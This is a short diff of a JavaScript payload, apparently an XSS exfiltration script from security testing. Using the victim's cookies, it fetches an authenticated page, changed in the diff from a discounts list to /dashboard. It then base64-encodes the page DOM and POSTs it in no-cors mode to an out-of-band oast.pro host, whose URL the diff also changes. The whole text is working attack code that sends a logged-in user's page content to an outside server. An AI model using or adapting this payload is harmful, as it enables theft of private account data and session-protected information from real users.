@@ -1,6 +1,6 @@
 (async () => {
     // Fetch the DOM content of /bank/main.jsp
-    const response = await fetch('/discounts/list_discounts', {
+    const response = await fetch('/dashboard', {
         method: 'GET',
         credentials: 'include', // Include cookies for authenticated requests
     });
@@ -13,7 +13,7 @@
         const encodedDOM = btoa(domContent);
 
         // Send the encoded DOM to your server using 'no-cors'
-        await fetch('https://ctt9bb1ntu5vn2phjlj0n815zjofqc4jg.oast.pro', {
+        await fetch('https://cttquupntu5rdc61106gsdsbrxw15ikub.oast.pro', {
             method: 'POST',
             mode: 'no-cors', // Bypass CORS but limits response visibility
             headers: {
